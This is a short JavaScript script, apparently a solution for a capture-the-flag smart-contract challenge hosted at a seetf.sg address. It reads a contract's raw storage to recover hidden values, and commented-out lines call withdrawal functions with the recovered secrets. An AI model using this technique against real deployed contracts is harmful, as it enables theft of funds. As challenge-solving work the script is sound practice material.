const { ethers, BigNumber } = require("ethers");
const Web3 = require("web3");
const web3 = new Web3();

const ABI = require("./ABI.json");
const provider = new ethers.providers.JsonRpcProvider(
    "http://awesome.chall.seetf.sg:40002"
);
const contractAddress = "0x91F1638Ab036cEe2b48306812D57220c3399635E"
const contract = new ethers.Contract(contractAddress, ABI, provider);
const privateKey = "REDACTED"
const wallet = new ethers.Wallet(privateKey, provider)
const contractWithSigner = contract.connect(wallet);

// const hex_to_dec = _hex => {
//     return parseInt(_hex, 16);
// }

// const hex_to_ascii = _hex => {
//     const hex = _hex.toString();
//     let str = '';
//     for (let i = 0; i < hex.length; i += 2) {
//         str += String.fromCharCode(parseInt(hex.substr(i,2),16));
//     }
//     return str;
// }


const contractInteraction = async() => {
    overrides = {
        gasLimit: 100000
    }

    const tx = await provider.getStorageAt(contractAddress, 0);
    console.log(tx);
    // const secondtx = await provider.getStorageAt(contractAddress, 2);

    // const fifthtx = await contractWithSigner.withdrawFirstWinPrizeMoneyBonus(overrides);
    // console.log(fifthtx);
    // const fourthtx = await contractWithSigner.withdrawFunds(BigNumber.from("0x01a02ead5e5f0dfd77"), ethers.utils.formatBytes32String("Wayyang"), ethers.utils.formatBytes32String("Cute"), 1654324648);
    // // console.log(fourthtx);
    // const lastTx = await contract.balanceOf("0x47bbA9C80Bca1668A468275f0687967E2B4498d5");
    // console.log(ethers.utils.formatEther(lastTx));
}

contractInteraction();
// console.log(ethers.utils.formatBytes32String("Wayyang"));
// console.log(ethers.utils.formatBytes32String("Cute"));